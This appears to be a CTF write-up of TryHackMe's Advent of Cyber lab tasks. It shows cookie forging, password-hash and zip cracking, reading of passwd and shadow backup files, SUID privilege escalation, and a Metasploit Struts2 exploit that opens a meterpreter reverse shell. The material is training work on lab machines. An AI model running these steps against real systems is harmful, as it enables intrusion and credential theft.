# THM_Advent of Cyber

---

### [Task 6] [Day 1] Inventory Management

- What is the name of the cookie used for authentication?

  **Solution:**

  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_1_%231.png" alt="solution" style="zoom:150%;" />

  authid

- If you decode the cookie, what is the value of the fixed part of the cookie?

  **Solution:**

  User: example, authid: ZXhhbXBsZXY0ZXI5bGwxIXNz

  User: david, authid: ZGF2aWR2NGVyOWxsMSFzcw==

  User: dario, authid: ZGFyaW92NGVyOWxsMSFzcw==

  ~~~bash
  $ echo ZXhhbXBsZXY0ZXI5bGwxIXNz  | base64 -d ; echo 
  examplev4er9ll1!ss
  $ echo ZGF2aWR2NGVyOWxsMSFzcw==  | base64 -d ; echo 
  davidv4er9ll1!ss
  $ echo ZGFyaW92NGVyOWxsMSFzcw==  | base64 -d ; echo 
  dariov4er9ll1!ss
  ~~~

  Fixed part: v4er9ll1!ss

- After accessing his account, what did the user mcinventory request? 

  **Solution:**

  ~~~bash
  $ echo mcinventoryv4er9ll1ssh | base64
  bWNpbnZlbnRvcnl2NGVyOWxsMXNzaAo=
  ~~~

~~~
  
  *Using Insomnia to create http request*
  
  <img src="https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_1_%23.png" alt="solution" style="zoom:150%;" />
  
  firewall

---

### [Task 7] [Day 2] Arctic Forum

- What is the path of the hidden page? 

  **Solution:**

  ~~~bash
  $ gobuster dir -u http://10.10.29.37:3000 -w /usr/share/wordlists/dirb/big.txt 
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.29.37:3000
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/dirb/big.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Timeout:        10s
  ===============================================================
  2020/09/15 15:43:00 Starting gobuster
  ===============================================================
  /ADMIN (Status: 302)
  /Admin (Status: 302)
  /Home (Status: 302)
  /Login (Status: 200)
  /SysAdmin (Status: 200)
  /admin (Status: 302)
  /assets (Status: 301)
  /css (Status: 301)
  /home (Status: 302)
  /js (Status: 301)
  /login (Status: 200)
  /logout (Status: 302)
  /sysadmin (Status: 200) <--
  ===============================================================
  2020/09/15 15:45:07 Finished
  ===============================================================
~~~

- What is the password you found? 

  **Solution:**

  <https://github.com/ashu-savani/arctic-digital-design>

  ~~~markdown
  README.md
  Arctic Digital Design
  
  arctic digital design used for advent of cyber
  
  Previous versions of this software have been shipped out. The credentials to log in are:
  
      username: admin
      password: defaultpass 
  
  ** the login portal accepts usernames instead of emails **
  ~~~

  defaultpass

- What do you have to take to the 'partay'

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_7_%233.png)

  Eggnog

---

### [Task 8] [Day 3] Evil Elf

*Given file: Evil Elf.pcap*

- Whats the destination IP on packet number 998?

  **Solution:**

  63.32.89.195

- What item is on the Christmas list?

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_8_%232.png)

- Crack buddy's password!

  **Solution:**

  ~~~bash
  $ cat Task_8_#3.txt 
  buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
  $ john --show Task_8_#3.txt 
  buddy:rainbow:18233:0:99999:7:::
  
  1 password hash cracked, 0 left
  ~~~

---

### [Task 9] [Day 4] Training

*Given data (ssh):* 

*username: mcsysadmin*
*password: bestelf1234*

- How many visible files are there in the home directory(excluding ./ and ../)?

  **Solution:**

  8

- What is the content of file5?

  **Solution:**

  ~~~bash
  [mcsysadmin@ip-10-10-229-252 ~]$ cat file5
  recipes
  ~~~

- Which file contains the string ‘password’?

  **Solution:**

  ~~~bash
  [mcsysadmin@ip-10-10-229-252 ~]$ grep password file*
  file6:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply
  ~~~

- What is the IP address in a file in the home folder?

  **Solution:**

  ~~~bash
  [mcsysadmin@ip-10-10-229-252 ~]$ grep 10.*.*.* file*
  file1:xwJZ7JVU/ojgdrLk57xlGtblDTy8aAHXWYX0hr9mxjmUgJ4SSBj/qyWXOm210UE+
  file1:NMgOQau+IeLkq9lqOhIv8za2VgHrKdXHMiqufUfThcGhc2qKzU1wi22q4k10yo9N
  file2:10.0.0.05eXWx4auBc8Swra4aPvIoBre+PRsVgu9GVbGwD33X8bd7TWwlZxzSVYa <--
  file2:4QnLPFyxTcX/p8QCAMlYkZD5QmumuGuTN5OdNu1/TQXT7wakfVX10xNy3T5oshpl
  file2:J3V4ueE0SLM974/4SrAU00iOBHj+10x1ssgVOzxFNgeqlAAzGmZnNBa0PqRxNqS0
  file3:2gnvXURcX2UvC9aL6EhuYgMsV73XEn4RbmEqB1/ApDj3jEl3/qLx5gUA10sJ1NOO
  file3:1DY3Z5DXRt0ker8QrDl590/V6gwnN3MH21sypPQM100oVJ8+MWfP+CAwJztxpSCx
  file6:UnOhnX0Wk2srhNqkx7z26c10QK/ksVo+zKk+kYzxYbUBXXK2mOCAXOCQIAKQARCI
  file6:ouWxLUGGFA5JF22pyMJm+o010otR86FFC4VvQklDq7F6BUzRvZpnvNWJ8XvrDhA3
  file6:bTW1AfD10FhoMP4PETyB/QFeimtpsorVTzfQX1sYSXfdpUMHoNLohLw4wVQahtEb
  file6:SMvoiUHxQOPAvcuP5emnGf1014AMKXAbWC1mW7jwkd4sAEr/w2gIjxvw116N1uQG
  file7:QrYJraPDBqj+vkpPq4L77+S6jNiKhv41GWud6zV+dB2rvy2WdbvOh0MXj3DJ610w
  file7:Dk10t+d0f16iqwkLW6Dvnkx7gEPFH3B3HuTudMM4LjVsHa55yGPRV3hP0NCXtxJy
  file7:iTd10iv2HnMOKWXletHxsuVoaQZIv5SxynVW9KJQkezBJB6ciM9rcwIjsQrVDoyy
  file7:WbR2gSKwaftfebzG+mYmDB1PvQOmelEfwUIq0PHhUlTX6LStYEHoUTyEgEGV10uK
  file7:10WgeZWnG7Q/xLqY2m2v0BMZeJCk8Obxfdc1ML6ZxNpGtJvN74yW7E7eaZSxsOLR
  file7:0Oe56YzCkzlU10TG33Wp632tqMEe4HpADuAtIoOOvJ7CjMLFA2LvRVdZyAPLEcGN
  file7:Wal10oHoK5jo33VWv4PpXdHdh6VlhZz0Bi2+7qHfpBIysatTeexu7dRy1x+TmKve
  file7:DMr5NaLBlfuL8iHq7000IFD8PVwEu+xXkYX2IcXGwBJH0s0PaTYtvF+BeSBb10FN
  file8:IpK1n7Fbjkx/EtjC0zKlDrQ/ETCE1nebYSXfH5hqFUyVZ10A0xKiSED6eMYqoUJa
  file8:wWZRzJNvUytwH10BMwz4iOK3jO93CHomj4jgEYZe5wFsQZiBMf3xxUz2cdbhGjc/
  file8:4H2sXY0JwbZ+6VBx/MrupXOCWui4512X6BVp10kXxyi/2iKyuPqE/NlZo2YKTd9x
  ~~~

- How many users can log into the machine?

  **Solution:**

  ~~~bash
  [mcsysadmin@ip-10-10-229-252 ~]$ cat /etc/passwd
  root:x:0:0:root:/root:/bin/bash
  bin:x:1:1:bin:/bin:/sbin/nologin
  daemon:x:2:2:daemon:/sbin:/sbin/nologin
  adm:x:3:4:adm:/var/adm:/sbin/nologin
  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
  sync:x:5:0:sync:/sbin:/bin/sync
  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
  halt:x:7:0:halt:/sbin:/sbin/halt
  mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
  operator:x:11:0:operator:/root:/sbin/nologin
  games:x:12:100:games:/usr/games:/sbin/nologin
  ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
  nobody:x:99:99:Nobody:/:/sbin/nologin
  systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
  dbus:x:81:81:System message bus:/:/sbin/nologin
  rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
  libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
  sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
  rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
  nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
  ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin
  postfix:x:89:89::/var/spool/postfix:/sbin/nologin
  chrony:x:997:995::/var/lib/chrony:/sbin/nologin
  tcpdump:x:72:72::/:/sbin/nologin
  ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
  mcsysadmin:x:1001:1001::/home/mcsysadmin:/bin/bash
  
  [mcsysadmin@ip-10-10-229-252 ~]$ cat /etc/passwd | grep /bin/bash | wc -l
  3
  ~~~

- What is the sha1 hash of file8?

  **Solution:**

  ~~~bash
  [mcsysadmin@ip-10-10-229-252 ~]$ sha1sum file8
  fa67ee594358d83becdd2cb6c466b25320fd2835  file8
  
  ~~~

- What is mcsysadmin’s password hash?

  **Solution:**

  ~~~bash
  [mcsysadmin@ip-10-10-229-252 ~]$ find / -name shadow.* -type f 2>/dev/null | head
  /var/shadow.bak
  /usr/share/doc/python-babel-0.9.6/doc/common/style/shadow.gif
  /usr/share/locale/ca/LC_MESSAGES/shadow.mo
  /usr/share/locale/da/LC_MESSAGES/shadow.mo
  /usr/share/locale/de/LC_MESSAGES/shadow.mo
  /usr/share/locale/es/LC_MESSAGES/shadow.mo
  /usr/share/locale/fi/LC_MESSAGES/shadow.mo
  /usr/share/locale/fr/LC_MESSAGES/shadow.mo
  /usr/share/locale/gl/LC_MESSAGES/shadow.mo
  /usr/share/locale/hu/LC_MESSAGES/shadow.mo
  
  [mcsysadmin@ip-10-10-229-252 ~]$ cat /var/shadow.bak | tail
  libstoragemgmt:!!:18218::::::
  sshd:!!:18218::::::
  rpcuser:!!:18218::::::
  nfsnobody:!!:18218::::::
  ec2-instance-connect:!!:18218::::::
  postfix:!!:18218::::::
  chrony:!!:18218::::::
  tcpdump:!!:18218::::::
  ec2-user:!!:18234:0:99999:7:::
  mcsysadmin:$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/:18234:0:99999:7::: <--
  ~~~

---

### [Task 10] [Day 5] Ho-Ho-Hosint

- What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_10_%231.png)

  ~~~bash
  $ python3 sherlock.py JLolax1
  $ cat JLolax1.txt 
  https://www.linkedin.com/in/JLolax1
  https://www.taringa.net/JLolax1
  https://mobile.twitter.com/JLolax1 <--
  https://tracr.co/users/1/JLolax1
  Total Websites Username Detected On : 4
  ~~~

   December 29, 1900

- What is Lola's current occupation?

  **Solution:**

  Santa's Helpers

- What phone does Lola make?

  **Solution:**

  iPhone X

- What date did Lola first start her photography? Format: dd/mm/yyyy

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_10_%234.png) 

  23/10/2014

- What famous woman does Lola have on her web page?

  **Solution:**

  Ada Lovelace

---

### [Task 11] [Day 6] Data Elf-iltration

*Given file: holidaythief.pcap*

- What data was exfiltrated via DNS?

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_11_%231.png)

  

  Hex to UTF-8: Candy Cane Serial Number 8491

- What did Little Timmy want to be for Christmas?

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_11_%232.png)

  

  ~~~bash
  $ ls
  christmaslists.zip   data.txt  'Evil Elf.pcap'   holidaythief.pcap   Task_8_#3.txt   thegrinch.jpg   TryHackMe.jpg
  $ unzip christmaslists.zip 
  Archive:  christmaslists.zip
  [christmaslists.zip] christmaslistdan.tx password: 
     skipping: christmaslistdan.tx     incorrect password
     skipping: christmaslistdark.txt   incorrect password
     skipping: christmaslistskidyandashu.txt  incorrect password
     skipping: christmaslisttimmy.txt  incorrect password
  $ python3 ~/git/zydra/zydra.py -f ~/ctf/thm_advent_of_cyber/resources/files/christmaslists.zip -d ~/wordlist/kaonashi14M.txt 
  
  	@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  		####### #     # ######  ######     #    
  		     #   #   #  #     # #     #   # #   
  		    #     # #   #     # #     #  #   #  
  		   #       #    #     # ######  #     # 
  	      ok  #        #    #     # #   #   ####### 
  		 #         #    #     # #    #  #     # 
  		#######    #    ######  #     # #     # 
  		                                        
  		Author : Hamed Hosseini
  	@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  
  Start time ==> Thu Sep 17 20:38:57 2020
  
   [*] Count of possible passwords: 14344391
  	Progress : [                                          ] 0.043 %	
  	[+] Password Found: december
  
  End time ==> Thu Sep 17 20:39:09 2020
  Execution time ==> 0:00:11.711129
  
  $ unzip christmaslists.zip -d christmaslists
  Archive:  christmaslists.zip
  [christmaslists.zip] christmaslistdan.tx password: 
   extracting: christmaslists/christmaslistdan.tx  
    inflating: christmaslists/christmaslistdark.txt  
    inflating: christmaslists/christmaslistskidyandashu.txt  
    inflating: christmaslists/christmaslisttimmy.txt  
  $ ls
   christmaslists   christmaslists.zip   data.txt  'Evil Elf.pcap'   holidaythief.pcap   Task_8_#3.txt   thegrinch.jpg   TryHackMe.jpg
  $ cd christmaslists
  $ ls
  christmaslistdan.tx  christmaslistdark.txt  christmaslistskidyandashu.txt  christmaslisttimmy.txt
  $ cat christmaslisttimmy.txt 
  Dear Santa,
  For Christmas I would like to be a PenTester! Not the Bic kind!
  Thank you,
  Little Timmy.
  ~~~

  Pentester

- What was hidden within the file?

  **Solution:**

  ```bash
  $ steghide extract -sf TryHackMe.jpg -xf data.txt
  Enter passphrase: 
  wrote extracted data to "data.txt".
  $ cat data.txt 
                                ARPAWOCKY
  			       				RFC527
  
                      Twas brillig, and the Protocols
                           Did USER-SERVER in the wabe.
                      All mimsey was the FTP,
                           And the RJE outgrabe,
  
                      Beware the ARPANET, my son;
                           The bits that byte, the heads that scratch;
                      Beware the NCP, and shun
                           the frumious system patch,
  
                      He took his coding pad in hand;
                           Long time the Echo-plex he sought.
                      When his HOST-to-IMP began to limp
                           he stood a while in thought,
  
                      And while he stood, in uffish thought,
                           The ARPANET, with IMPish bent,
                      Sent packets through conditioned lines,
                           And checked them as they went,
  
                      One-two, one-two, and through and through
                           The IMP-to-IMP went ACK and NACK,
                      When the RFNM came, he said "I'm game",
                           And sent the answer back,
  
                      Then hast thou joined the ARPANET?
                           Oh come to me, my bankrupt boy!
                      Quick, call the NIC! Send RFCs!
                           He chortled in his joy.
  
                      Twas brillig, and the Protocols
                           Did USER-SERVER in the wabe.
                      All mimsey was the FTP,
                           And the RJE outgrabe.
  
                                                              D.L. COVILL
                                                              May 1973
  
  ```

  RFC527

---

### [Task 12] [Day 7] Skilling Up

- how many TCP ports under 1000 are open?

  **Solution:**

  ~~~bash
  $ nmap 10.10.10.235 -p T:1-1000
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 16:00 CEST
  Nmap scan report for 10.10.10.235
  Host is up (0.040s latency).
  Not shown: 997 closed ports
  PORT    STATE SERVICE
  22/tcp  open  ssh
  111/tcp open  rpcbind
  999/tcp open  garcon
  
  Nmap done: 1 IP address (1 host up) scanned in 2.83 seconds
  ~~~

  3

- What is the name of the OS of the host?

  **Solution:**

  ~~~bash
  $ sudo nmap 10.10.10.235 -O
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 16:01 CEST
  Nmap scan report for 10.10.10.235
  Host is up (0.040s latency).
  Not shown: 997 closed ports
  PORT    STATE SERVICE
  22/tcp  open  ssh
  111/tcp open  rpcbind
  999/tcp open  garcon
  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  TCP/IP fingerprint:
  OS:SCAN(V=7.80%E=4%D=9/18%OT=22%CT=1%CU=31295%PV=Y%DS=2%DC=I%G=Y%TM=5F64BDC
  OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
  OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
  OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
  OS:(R=Y%DF=Y%T=FF%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=A
  OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
  OS:=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F
  OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
  OS:T=FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD
  OS:=S)
  
  Network Distance: 2 hops
  
  OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
  ~~~

  Linux

- What version of SSH is running?

  **Solution:**

  ~~~bash
  $ sudo nmap 10.10.10.235 -p22 -sV
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 16:03 CEST
  Nmap scan report for 10.10.10.235
  Host is up (0.071s latency).
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds
  ~~~

  7.4

- What is the name of the file that is accessible on the server you found running?

  **Solution:**

  ![solution](https://github.com/Faridbg/THM_Advent_of_Cyber/blob/main/resources/images/Task_12_%234.png)

---

### [Task 12] [Day 7] Skilling Up

*Given data:*

*Username: holly*
Password: tuD@4vt0G*TU

- What port is SSH running on? 

  **Solution:**

  ~~~bash
  $ nmap 10.10.146.121 -p1-65535
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 16:27 CEST
  Nmap scan report for 10.10.146.121
  Host is up (0.043s latency).
  Not shown: 65534 closed ports
  PORT      STATE SERVICE
  65534/tcp open  unknown
  
  Nmap done: 1 IP address (1 host up) scanned in 30.57 seconds
  ~~~

- Find and run a file as *igor*. Read the file /home/igor/flag1.txt

  **Solution:**

  ~~~bash
  holly@ip-10-10-146-121:~$ find / -user igor -perm -4000 2>/dev/null
  /usr/bin/find
  /usr/bin/nmap
  holly@ip-10-10-146-121:~$ touch aaa
  holly@ip-10-10-146-121:~$ find aaa -exec cat /home/igor/flag1.txt \;
  THM{d3f0708bdd9accda7f937d013eaf2cd8}
  ~~~

- Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?

  **Solution:**

  ~~~bash
  holly@ip-10-10-146-121:~$ find / -user root -perm -4000 2>/dev/null
  /bin/ping
  /bin/umount
  /bin/ping6
  /bin/su
  /bin/fusermount
  /bin/mount
  /snap/core/7396/bin/mount
  /snap/core/7396/bin/ping
  /snap/core/7396/bin/ping6
  /snap/core/7396/bin/su
  /snap/core/7396/bin/umount
  /snap/core/7396/usr/bin/chfn
  /snap/core/7396/usr/bin/chsh
  /snap/core/7396/usr/bin/gpasswd
  /snap/core/7396/usr/bin/newgrp
  /snap/core/7396/usr/bin/passwd
  /snap/core/7396/usr/bin/sudo
  /snap/core/7396/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /snap/core/7396/usr/lib/openssh/ssh-keysign
  /snap/core/7396/usr/lib/snapd/snap-confine
  /snap/core/7396/usr/sbin/pppd
  /usr/bin/system-control <--
  /usr/bin/newuidmap
  /usr/bin/passwd
  /usr/bin/newgrp
  /usr/bin/sudo
  /usr/bin/chsh
  /usr/bin/chfn
  /usr/bin/pkexec
  /usr/bin/gpasswd
  /usr/bin/newgidmap
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/lib/openssh/ssh-keysign
  /usr/lib/snapd/snap-confine
  /usr/lib/eject/dmcrypt-get-device
  holly@ip-10-10-146-121:~$ system-control
  
  ===== System Control Binary =====
  
  Enter system command: cat /root/flag2.txt
  THM{8c8211826239d849fa8d6df03749c3a2}
  ~~~

---

### [Task 14] [Day 9] Requests

- What is the value of the flag?

  **Solution:**

  ~~~python
  import requests
  import json
  
  base_url = 'http://10.10.169.100:3000/'
  arr_value = []
  sufix = None
  
  while (True):
      if (sufix == None):
          r = requests.get(base_url)
      else:
          r = requests.get(base_url + sufix)
      r = json.loads(r.text)
      sufix = r["next"]
      if(sufix == 'end'):
          break
      arr_value.append(r["value"])
  
  sol = ''.join(str(e) for e in arr_value)
  print(sol)
  ~~~

  ~~~bash
  $ python3 Task_14_#1.py 
  sCrIPtKiDd
  ~~~

---

### [Task 15] [Day 10] Metasploit-a-ho-ho-ho

- Compromise the web server using Metasploit. What is flag1?

  **Solution:**

  ~~~bash
  $ msfconsole
                                                    
   _                                                    _
  / \    /\         __                         _   __  /_/ __
  | |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
  | | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
  |_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
        |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
  
  
         =[ metasploit v5.0.101-dev                         ]
  + -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
  + -- --=[ 562 payloads - 45 encoders - 10 nops            ]
  + -- --=[ 7 evasion                                       ]
  
  Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more
  
  msf5 > search struts2
  
  Matching Modules
  ================
  
     #  Name                                             Disclosure Date  Rank       Check  Description
     -  ----                                             ---------------  ----       -----  -----------
     0  exploit/multi/http/struts2_code_exec_showcase    2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
     1  exploit/multi/http/struts2_content_type_ognl     2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
     2  exploit/multi/http/struts2_namespace_ognl        2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
     3  exploit/multi/http/struts2_rest_xstream          2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
     4  exploit/multi/http/struts_code_exec_classloader  2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
     5  exploit/multi/http/struts_code_exec_parameters   2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
     6  exploit/multi/http/struts_dev_mode               2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
  
  
  Interact with a module by name or index, for example use 6 or use exploit/multi/http/struts_dev_mode
  
  msf5 > use exploit/multi/http/struts2_content_type_ognl
  [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
  
  msf5 exploit(multi/http/struts2_content_type_ognl) > show options
  
  Module options (exploit/multi/http/struts2_content_type_ognl):
  
     Name       Current Setting   Required  Description
     ----       ---------------   --------  -----------
     Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS     10.10.130.244     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
     RPORT      80                yes       The target port (TCP)
     SSL        false             no        Negotiate SSL/TLS for outgoing connections
     TARGETURI  /showcase.action  yes       The path to a struts application action
     VHOST                        no        HTTP server virtual host
  
  
  Payload options (linux/x64/meterpreter/reverse_tcp):
  
     Name   Current Setting  Required  Description
     ----   ---------------  --------  -----------
     LHOST  10.9.90.233      yes       The listen address (an interface may be specified)
     LPORT  4444             yes       The listen port
  
  
  Exploit target:
  
     Id  Name
     --  ----
     0   Universal
  
  msf5 exploit(multi/http/struts2_content_type_ognl) > run
  
  [*] Started reverse TCP handler on 10.9.90.233:4444 
  [*] Sending stage (3012516 bytes) to 10.10.130.244
  [*] Meterpreter session 1 opened (10.9.90.233:4444 -> 10.10.130.244:33186) at 2020-09-18 23:03:09 +0200
  
  meterpreter > cd /root 
  meterpreter > ls
  Listing: /root
  ==============
  
  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  100600/rw-------  623   fil   2019-12-08 22:12:44 +0100  .bash_history
  100644/rw-r--r--  570   fil   2019-10-23 21:16:44 +0200  .bashrc
  40700/rwx------   4096  dir   2019-10-23 21:16:52 +0200  .gnupg
  100644/rw-r--r--  140   fil   2019-10-23 21:16:44 +0200  .profile
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  .vim
  100600/rw-------  8163  fil   2019-12-08 22:12:44 +0100  .viminfo
  
  meterpreter > cat .bash_history 
  apt install vim
  apt update
  apt install vim
  ls
  cd webapps/
  ls -la
  cd ROOT
  ls -la
  cd WEB-INF/
  ls
  cd ../META-INF/
  ls
  cd ../WEB-INF/
  ls
  ls -la
  vi decorators
  cd decorators
  ls
  ls -la
  vim main.jsp 
  vim main.jsp 
  cd ../../
  ls
  ls -la
  vim showcase.jsp 
  vim showcase.jsp 
  cd images/
  wget http://d21c.com/santa/santa/list-santa.gif
  ls
  cd ../
  vim showcase.jsp 
  ls -la
  cd /home/
  ls
  mkdir santa
  ls -la
  cd santa/
  ls -la
  cd ../
  cd santa/
  vim ssh-creds.txt
  cd ../
  ls -la
  cd santa/
  ls
  cat ssh-creds.txt 
  cd /usr/local/tomcat/webapps/
  ls
  ls -la
  cd ROOT
  ls -la
  vim ThisIsFlag1.txt
  cd /home
  ls
  cd santa/
  ls
  ls -la
  cat ssh-creds.txt 
  ls -la
  exit
  meterpreter > cd /usr/local/tomcat/webapps/ROOT
  meterpreter > ls
  Listing: /usr/local/tomcat/webapps/ROOT
  =======================================
  
  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  META-INF
  100644/rw-r--r--  38    fil   2019-12-08 22:12:44 +0100  ThisIsFlag1.txt
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  WEB-INF
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  actionchaining
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  ajax
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  chat
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  conversion
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  customTemplateDir
  100644/rw-r--r--  65    fil   2019-12-08 22:12:44 +0100  date.jsp
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  empmanager
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  filedownload
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  fileupload
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  freemarker
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  hangman
  100644/rw-r--r--  997   fil   2019-12-08 22:12:44 +0100  help.jsp
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  images
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  img
  100644/rw-r--r--  48    fil   2019-12-08 22:12:44 +0100  index.jsp
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  integration
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  interactive
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  js
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  jsf
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  modelDriven
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  person
  100644/rw-r--r--  694   fil   2019-12-08 22:12:44 +0100  showcase.jsp
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  styles
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  tags
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  template
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  tiles
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  token
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  validation
  100644/rw-r--r--  1399  fil   2019-12-08 22:12:44 +0100  viewSource.jsp
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  wait
  40755/rwxr-xr-x   4096  dir   2019-12-08 22:12:45 +0100  xslt
  
  meterpreter > cat ThisIsFlag1.txt 
  THM{3ad96bb13ec963a5ca4cb99302b37e12}
  ~~~

  THM{3ad96bb13ec963a5ca4cb99302b37e12}

- Now you've compromised the web server, get onto the main system. What is Santa's SSH password?

  **Solution:**

